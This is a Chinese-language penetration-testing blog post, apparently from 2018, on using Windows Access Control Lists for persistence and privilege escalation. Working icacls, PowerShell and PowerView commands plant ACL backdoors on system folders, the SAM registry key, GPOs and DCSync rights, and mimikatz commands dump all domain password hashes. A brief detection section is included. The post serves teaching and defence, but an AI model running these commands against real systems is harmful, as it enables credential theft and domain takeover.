@@ -1,0 +1,493 @@
+<article class="post">
+  <h1>渗透技巧——Windows下的Access Control List</h1>
+
+  <div class="entry">
+    <h2 id="0x00-前言">0x00 前言</h2>
+<hr>
+
+<p>Windows系统中的ACL(Access Control List)，用来表示用户（组）权限的列表。</p>
+
+<p>在渗透测试中，理解并运用ACL，尤其在后门利用(提权)方面，可供发挥的空间很大。</p>
+
+<p>而站在防御的角度，如果系统被攻破，找到并清除攻击者留下的ACL后门，同样需要对ACL有一定的了解。</p>
+
+<h2 id="0x01-简介">0x01 简介</h2>
+<hr>
+
+<p>本文将要介绍以下内容：</p>
+
+<ul>
+  <li>ACL相关概念</li>
+  <li>查看ACL</li>
+  <li>ACL利用(文件、注册表和域环境)</li>
+  <li>ACL检测</li>
+</ul>
+
+<h2 id="0x02-acl相关概念">0x02 ACL相关概念</h2>
+<hr>
+
+<p>官方文档：</p>
+
+<p>https://docs.microsoft.com/en-us/windows/desktop/SecAuthZ/access-control-lists</p>
+
+<h4 id="acl">ACL：</h4>
+
+<p>Access Control List，用来表示用户（组）权限的列表，包括DACL和SACL</p>
+
+<h4 id="ace">ACE：</h4>
+
+<p>Access Control Entry，ACL中的元素</p>
+
+<h4 id="dacl">DACL：</h4>
+
+<p>Discretionary Access Control List，用来表示安全对象权限的列表</p>
+
+<h4 id="sacl">SACL：</h4>
+
+<p>System Access Control List，用来记录对安全对象访问的日志</p>
+
+<h4 id="直观理解">直观理解：</h4>
+
+<p>Windows访问控制模型中会用到ACL，比如文件、注册表的权限都包括ACL，用来表示哪些用户（组）具有操作权限</p>
+
+<p>例如对某个文件进行访问，系统将做以下判断：</p>
+
+<ul>
+  <li>如果没有DACL，系统将允许访问</li>
+  <li>如果存在DACL，但没有ACE，系统将拒绝所有访问</li>
+  <li>如果存在DACL，也存在ACE，那么会按照每个ACE指定允许或拒绝</li>
+</ul>
+
+<h3 id="实例演示">实例演示</h3>
+
+<p>对于文件夹<code class="language-plaintext highlighter-rouge">C:\Windows\SYSVOL\sysvol\test.com</code>,查看文件夹属性</p>
+
+<p>默认共有五条DACL，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-12/2-1.png" alt="Alt text"></p>
+
+<p>选中一条DACL，其中包含多个ACE，表示具有的权限，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-12/2-2.png" alt="Alt text"></p>
+
+<h2 id="0x03-文件中的acl">0x03 文件中的ACL</h2>
+<hr>
+
+<h3 id="常用命令icacls">常用命令(icacls)：</h3>
+
+<h4 id="1查看指定文件的acl">1、查看指定文件的ACL</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>icacls C:\Windows\SYSVOL\sysvol\test.com
+</code></pre></div></div>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-12/3-1.png" alt="Alt text"></p>
+
+<h4 id="2备份指定文件包括当前目录及其子目录中的文件的acl">2、备份指定文件(包括当前目录及其子目录中的文件)的ACL</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>icacls C:\Windows\SYSVOL\sysvol\test.com /save AclFile /t
+</code></pre></div></div>
+
+<h4 id="3还原指定文件包括当前目录及其子目录中的文件的acl">3、还原指定文件(包括当前目录及其子目录中的文件)的ACL</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>icacls C:\Windows\SYSVOL\sysvol\ /restore AclFile /t
+</code></pre></div></div>
+
+<p><strong>注：</strong></p>
+
+<p>还原时，路径需要设置为上级目录</p>
+
+<h4 id="4添加用户test1对指定文件包括当前目录及其子目录中的文件的完全访问权限">4、添加用户test1对指定文件(包括当前目录及其子目录中的文件)的完全访问权限</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>icacls C:\Windows\SYSVOL\sysvol\test.com /grant test1:(OI)(CI)(F) /t
+</code></pre></div></div>
+
+<p><strong>注：</strong></p>
+
+<p>(OI)代表对象继承
+(CI)代表容器继承
+(F)代表完全访问</p>
+
+<h4 id="5移除用户test1对指定文件包括当前目录及其子目录中的文件的完全访问权限">5、移除用户test1对指定文件(包括当前目录及其子目录中的文件)的完全访问权限</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>icacls C:\Windows\SYSVOL\sysvol\test.com /remove test1 /t
+</code></pre></div></div>
+
+<h3 id="常用命令powershell">常用命令(powershell)：</h3>
+
+<h4 id="1查看指定路径的acl">1、查看指定路径的ACL</h4>
+
+<p>例如<code class="language-plaintext highlighter-rouge">C:\Windows\SYSVOL\sysvol\test.com</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-Acl -Path 'C:\Windows\SYSVOL\sysvol\test.com'| Format-Table -wrap
+</code></pre></div></div>
+
+<h4 id="2添加用户test1对指定文件的完全访问权限">2、添加用户test1对指定文件的完全访问权限</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function Add-ACL{
+    [CmdletBinding()]           
+    Param (
+        [Parameter(Mandatory = $True)]
+        [String]
+        [ValidateNotNullOrEmpty()]
+        $Path
+    )
+
+    $acl = Get-Acl -Path $Path
+    $person = [System.Security.Principal.NTAccount]"test1"
+    $access = [System.Security.AccessControl.FileSystemRights]"FullControl"
+    $inheritance = [System.Security.AccessControl.InheritanceFlags]"ObjectInherit,ContainerInherit"
+    $propagation = [System.Security.AccessControl.PropagationFlags]"None"
+    $type = [System.Security.AccessControl.AccessControlType]"Allow"
+    $rule = New-Object System.Security.AccessControl.FileSystemAccessRule( `
+    $person,$access,$inheritance,$propagation,$type)
+    $acl.AddAccessRule($rule)
+    Set-Acl $Path $acl
+}
+Add-ACL -Path 'C:\Windows\SYSVOL\sysvol\test.com'
+</code></pre></div></div>
+
+<h4 id="3移除用户test1对指定文件的完全访问权限">3、移除用户test1对指定文件的完全访问权限</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function Remove-ACL{
+    [CmdletBinding()]           
+    Param (
+        [Parameter(Mandatory = $True)]
+        [String]
+        [ValidateNotNullOrEmpty()]
+        $Path
+    )
+
+    $acl = Get-Acl -Path $Path
+    $person = [System.Security.Principal.NTAccount]"test1"
+    $access = [System.Security.AccessControl.FileSystemRights]"FullControl"
+    $inheritance = [System.Security.AccessControl.InheritanceFlags]"ObjectInherit,ContainerInherit"
+    $propagation = [System.Security.AccessControl.PropagationFlags]"None"
+    $type = [System.Security.AccessControl.AccessControlType]"Allow"
+    $rule = New-Object System.Security.AccessControl.FileSystemAccessRule( `
+    $person,$access,$inheritance,$propagation,$type)
+    $acl.RemoveAccessRule($rule)
+    Set-Acl $Path $acl
+}
+Remove-ACL -Path 'C:\Windows\SYSVOL\sysvol\test.com'
+</code></pre></div></div>
+
+<h4 id="4添加用户test1对指定文件包括当前目录及其子目录中的文件的完全访问权限-1">4、添加用户test1对指定文件(包括当前目录及其子目录中的文件)的完全访问权限</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function Add-ACL{
+    [CmdletBinding()]           
+    Param (
+        [Parameter(Mandatory = $True)]
+        [String]
+        [ValidateNotNullOrEmpty()]
+        $Path
+    )
+
+    $acl = Get-Acl -Path $Path
+    $person = [System.Security.Principal.NTAccount]"test1"
+    $access = [System.Security.AccessControl.FileSystemRights]"FullControl"
+    $inheritance = [System.Security.AccessControl.InheritanceFlags]"None"
+    $propagation = [System.Security.AccessControl.PropagationFlags]"None"
+    $type = [System.Security.AccessControl.AccessControlType]"Allow"
+    $rule = New-Object System.Security.AccessControl.FileSystemAccessRule( `
+    $person,$access,$inheritance,$propagation,$type)
+    $acl.AddAccessRule($rule)
+    Set-Acl $Path $acl
+}
+Add-ACL -Path 'C:\Windows\SYSVOL\sysvol\test.com'
+$fileList = Get-ChildItem 'C:\Windows\SYSVOL\sysvol\test.com' -recurse
+Foreach($file in $fileList)
+{
+    $file.fullname
+    Add-ACL -Path $file.fullname
+}
+</code></pre></div></div>
+
+<h4 id="5移除用户test1对指定文件包括当前目录及其子目录中的文件的完全访问权限-1">5、移除用户test1对指定文件(包括当前目录及其子目录中的文件)的完全访问权限</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function Remove-ACL{
+    [CmdletBinding()]           
+    Param (
+        [Parameter(Mandatory = $True)]
+        [String]
+        [ValidateNotNullOrEmpty()]
+        $Path
+    )
+
+    $acl = Get-Acl -Path $Path
+    $person = [System.Security.Principal.NTAccount]"test1"
+    $access = [System.Security.AccessControl.FileSystemRights]"FullControl"
+    $inheritance = [System.Security.AccessControl.InheritanceFlags]"None"
+    $propagation = [System.Security.AccessControl.PropagationFlags]"None"
+    $type = [System.Security.AccessControl.AccessControlType]"Allow"
+    $rule = New-Object System.Security.AccessControl.FileSystemAccessRule( `
+    $person,$access,$inheritance,$propagation,$type)
+    $acl.RemoveAccessRule($rule)
+    Set-Acl $Path $acl
+}
+Remove-ACL -Path 'C:\Windows\SYSVOL\sysvol\test.com'
+$fileList = Get-ChildItem 'C:\Windows\SYSVOL\sysvol\test.com' -recurse
+Foreach($file in $fileList)
+{
+    Remove-ACL -Path $file.fullname
+}
+</code></pre></div></div>
+
+<h3 id="利用思路">利用思路：</h3>
+
+<h4 id="1本地提权后门">1、本地提权后门</h4>
+
+<p>在取得Windows系统的管理员权限后，可以修改系统目录的ACL，添加普通用户的完全访问权限，作为提权后门</p>
+
+<p>后续可以通过dll劫持、文件替换等多种方法从普通用户提升至管理员权限</p>
+
+<h4 id="2域环境gpo的修改">2、域环境GPO的修改</h4>
+
+<p>修改域内共享文件夹<code class="language-plaintext highlighter-rouge">\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\</code>的ACL，添加普通用户的完全访问权限</p>
+
+<p>后续可以使用域内普通用户的权限修改域环境的GPO，修改GPO的计划任务，实现计划任务的远程执行</p>
+
+<p>相关方法可参考之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8GPO%E4%B8%AD%E7%9A%84%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C/">《域渗透——利用GPO中的计划任务实现远程执行》</a></p>
+
+<h4 id="3域内普通用户读取域内所有用户hash">3、域内普通用户读取域内所有用户hash</h4>
+
+<p>创建ntds.dit的文件共享，添加ACL</p>
+
+<p>后续可以使用域内普通用户访问域控制器的ntds.dit文件，读取域内所有用户的hash</p>
+
+<h2 id="0x04-注册表中的acl">0x04 注册表中的ACL</h2>
+<hr>
+
+<h3 id="常用命令powershell-1">常用命令(powershell)：</h3>
+
+<h4 id="1查看指定路径的acl-1">1、查看指定路径的ACL</h4>
+
+<p>例如<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SAM</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-Acl -Path 'HKLM:\SAM'| Format-Table -wrap
+</code></pre></div></div>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-12/4-1.png" alt="Alt text"></p>
+
+<p>获得Access项的具体内容：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$acl = Get-Acl -Path 'HKLM:\SAM'
+$acl.Access
+</code></pre></div></div>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-12/4-2.png" alt="Alt text"></p>
+
+<h4 id="2添加用户test1对指定路径包括当前注册表项及其子健的完全访问权限">2、添加用户test1对指定路径(包括当前注册表项及其子健)的完全访问权限</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$acl = Get-Acl HKLM:\SAM
+$person = [System.Security.Principal.NTAccount]"test1"
+$access = [System.Security.AccessControl.RegistryRights]"FullControl"
+$inheritance = [System.Security.AccessControl.InheritanceFlags]"ObjectInherit,ContainerInherit"
+$propagation = [System.Security.AccessControl.PropagationFlags]"None"
+$type = [System.Security.AccessControl.AccessControlType]"Allow"
+$rule = New-Object System.Security.AccessControl.RegistryAccessRule( `
+$person,$access,$inheritance,$propagation,$type)
+$acl.AddAccessRule($rule)
+Set-Acl HKLM:\SAM $acl
+</code></pre></div></div>
+
+<p><strong>注：</strong></p>
+
+<p><code class="language-plaintext highlighter-rouge">$inheritance = [System.Security.AccessControl.InheritanceFlags]"ObjectInherit,ContainerInherit"</code>表示其子健继承当前注册表项的权限</p>
+
+<p>修改注册表项<code class="language-plaintext highlighter-rouge">HKLM:\SAM</code>的ACL需要Administrator权限</p>
+
+<p>修改注册表项<code class="language-plaintext highlighter-rouge">HKLM:\SAM\SAM</code>的ACL需要System权限</p>
+
+<h4 id="3移除用户test1对指定路径包括当前注册表项及其子健的完全访问权限">3、移除用户test1对指定路径(包括当前注册表项及其子健)的完全访问权限</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$acl = Get-Acl HKLM:\SAM
+$person = [System.Security.Principal.NTAccount]"test1"
+$access = [System.Security.AccessControl.RegistryRights]"FullControl"
+$inheritance = [System.Security.AccessControl.InheritanceFlags]"ObjectInherit,ContainerInherit"
+$propagation = [System.Security.AccessControl.PropagationFlags]"None"
+$type = [System.Security.AccessControl.AccessControlType]"Allow"
+$rule = New-Object System.Security.AccessControl.RegistryAccessRule( `
+$person,$access,$inheritance,$propagation,$type)
+$acl.RemoveAccessRule($rule)
+Set-Acl HKLM:\SAM $acl
+</code></pre></div></div>
+
+<h3 id="利用思路-1">利用思路：</h3>
+
+<h4 id="1本地提权后门-1">1、本地提权后门</h4>
+
+<p>修改注册表项<code class="language-plaintext highlighter-rouge">HKLM:\SAM</code>和<code class="language-plaintext highlighter-rouge">HKLM:\SYSTEM</code>，添加普通用户的完全访问权限</p>
+
+<p>普通用户能够通过注册表项获得本地所有用户的hash，进而获得管理员权限</p>
+
+<h4 id="3本地自启动后门">3、本地自启动后门</h4>
+
+<p>修改注册表位置，添加启动项或者劫持项</p>
+
+<h2 id="0x05-域环境中的acl">0x05 域环境中的ACL</h2>
+<hr>
+
+<p>通过Active Directory Service Interfaces (ADSI)实现</p>
+
+<p>官方文档：</p>
+
+<p>https://docs.microsoft.com/en-us/windows/desktop/AD/controlling-access-to-objects-in-active-directory-domain-services</p>
+
+<p>Powershell调用ADSI的参考资料：</p>
+
+<p>https://social.technet.microsoft.com/Forums/windowsserver/en-US/df3bfd33-c070-4a9c-be98-c4da6e591a0a/forum-faq-using-powershell-to-assign-permissions-on-active-directory-objects?forum=winserverpowershell</p>
+
+<h3 id="常用命令powershell-2">常用命令(powershell)：</h3>
+
+<p><strong>注：</strong></p>
+
+<p>PowerView已经实现了这部分内容，所以本节直接引用PowerView中的功能</p>
+
+<p>代码地址：</p>
+
+<p>https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</p>
+
+<h4 id="1获得当前域内所有对象">1、获得当前域内所有对象</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-DomainObject -Domain test.com
+</code></pre></div></div>
+
+<h4 id="2获得当前域内所有对象的acl">2、获得当前域内所有对象的ACL</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-DomainObjectAcl -Domain test.com
+</code></pre></div></div>
+
+<h4 id="3获得指定用户的acl">3、获得指定用户的ACL</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-DomainUser test1
+</code></pre></div></div>
+
+<h4 id="4添加用户test1对指定对象guid的完全访问权限">4、添加用户test1对指定对象(guid)的完全访问权限</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Add-DomainObjectAcl -TargetIdentity '483e9973-2d45-4e2f-b034-f272a26950e0' -PrincipalIdentity test1 -Rights All
+</code></pre></div></div>
+
+<h4 id="5移除用户test1对指定对象guid的完全访问权限">5、移除用户test1对指定对象(guid)的完全访问权限</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Remove-DomainObjectAcl -TargetIdentity '483e9973-2d45-4e2f-b034-f272a26950e0' -PrincipalIdentity test1 -Rights All
+</code></pre></div></div>
+
+<h3 id="利用思路-2">利用思路：</h3>
+
+<h4 id="1dcsync后门">1、DCSync后门</h4>
+
+<p><strong>注：</strong></p>
+
+<p>该方法学习自：https://www.specterops.io/assets/resources/an_ace_up_the_sleeve.pdf</p>
+
+<p>DCSync是mimikatz的一个功能，能够模拟域控制器并从域控制器导出帐户密码hash</p>
+
+<p>如果我们在域内一台主机上获得了域管理员权限，可以使用如下命令直接导出域内所有用户的hash：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz.exe privilege::debug "lsadump::dcsync /domain:test.com /all /csv" exit
+</code></pre></div></div>
+
+<p>导出域内administrator帐户的hash：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz.exe privilege::debug "lsadump::dcsync /domain:test.com /user:administrator /csv" exit
+</code></pre></div></div>
+
+<p>默认情况下，只有<code class="language-plaintext highlighter-rouge">Domain Controllers</code>和<code class="language-plaintext highlighter-rouge">Enterprise Domain Admins</code>权限能够使用DCSync</p>
+
+<p>但我们可以对<code class="language-plaintext highlighter-rouge">DS-Replication-GetChanges(GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)</code>和<code class="language-plaintext highlighter-rouge">DS-Replication-Get-Changes-All(1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)</code>添加ACL，这样就能实现普通用户调用DCSync导出域内所有用户的hash</p>
+
+<p>实现代码：</p>
+
+<p>https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1#L8270</p>
+
+<p>添加ACL的命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Add-DomainObjectAcl -TargetIdentity "DC=test,DC=com" -PrincipalIdentity test1 -Rights DCSync
+</code></pre></div></div>
+
+<p>接下来，在域内一台登录了test1用户的主机上面，就能使用mimikatz的DCSync功能</p>
+
+<p>删除ACL的命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Remove-DomainObjectAcl -TargetIdentity "DC=test,DC=com" -PrincipalIdentity test1 -Rights DCSync
+</code></pre></div></div>
+
+<h4 id="2gpo后门">2、GPO后门</h4>
+
+<p>(1)查看当前域内的GPO</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module GroupPolicy
+Get-GPO -All
+</code></pre></div></div>
+
+<p>如下图，<code class="language-plaintext highlighter-rouge">TestGPO</code>是我在测试环境自己添加的，<code class="language-plaintext highlighter-rouge">Default Domain Policy</code>和<code class="language-plaintext highlighter-rouge">Default Domain Controllers Policy</code>是域环境默认存在的GPO</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-12/4-3.png" alt="Alt text"></p>
+
+<p>(2)添加用户test1对TestGPO的完全访问权限</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$RawObject = Get-DomainGPO -Raw -Identity 'TestGPO'
+$TargetObject = $RawObject.GetDirectoryEntry()
+$ACE = New-ADObjectAccessControlEntry -InheritanceType All -AccessControlType Allow -PrincipalIdentity test1 -Right AccessSystemSecurity,CreateChild,Delete,DeleteChild,DeleteTree,ExtendedRight,GenericAll,GenericExecute,GenericRead,GenericWrite,ListChildren,ListObject,ReadControl,ReadProperty,Self,Synchronize,WriteDacl,WriteOwner,WriteProperty
+$TargetObject.PsBase.ObjectSecurity.AddAccessRule($ACE)
+$TargetObject.PsBase.CommitChanges()
+</code></pre></div></div>
+
+<p>(3)移除用户test1对TestGPO的完全访问权限</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$RawObject = Get-DomainGPO -Raw -Identity 'TestGPO'
+$TargetObject = $RawObject.GetDirectoryEntry()
+$ACE = New-ADObjectAccessControlEntry -InheritanceType All -AccessControlType Allow -PrincipalIdentity test1 -Right AccessSystemSecurity,CreateChild,Delete,DeleteChild,DeleteTree,ExtendedRight,GenericAll,GenericExecute,GenericRead,GenericWrite,ListChildren,ListObject,ReadControl,ReadProperty,Self,Synchronize,WriteDacl,WriteOwner,WriteProperty
+$TargetObject.PsBase.ObjectSecurity.RemoveAccessRule($ACE)
+$TargetObject.PsBase.CommitChanges()
+</code></pre></div></div>
+
+<p>后续可以对GPO进行操作，添加计划任务，实现计划任务的远程执行，具体方法可参考之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8GPO%E4%B8%AD%E7%9A%84%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C/">《域渗透——利用GPO中的计划任务实现远程执行》</a></p>
+
+<h2 id="0x06-acl检测">0x06 ACL检测</h2>
+<hr>
+
+<h4 id="1文件和注册表">1、文件和注册表</h4>
+
+<p>可借助开源工具WindowsDACLEnumProject：</p>
+
+<p>https://github.com/nccgroup/WindowsDACLEnumProject</p>
+
+<p>能够列出存在风险的ACL</p>
+
+<h4 id="3域环境">3、域环境</h4>
+
+<p>需要开启高级安全审核策略，参考资料：</p>
+
+<p>https://blogs.technet.microsoft.com/canitpro/2017/03/29/step-by-step-enabling-advanced-security-audit-policy-via-ds-access/</p>
+
+<p>开启策略后，Event ID 5136会记录域环境中ACL的修改，参考资料：</p>
+
+<p>https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=5136</p>
+
+<h2 id="0x07-小结">0x07 小结</h2>
+<hr>
+
+<p>本文介绍了Windows系统中的ACL在文件、注册表和域环境下后门利用方面的技巧，并给出检测后门的建议。</p>
+
+<p>我从PowerView中学到了很多域环境下ACL的知识，在此感谢作者的开源。</p>
+
+<hr>
+
+<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>
+
+
+  </div>
+
+  <div class="date">
+    Written on December 12, 2018
+  </div>
+
+  
+</article>
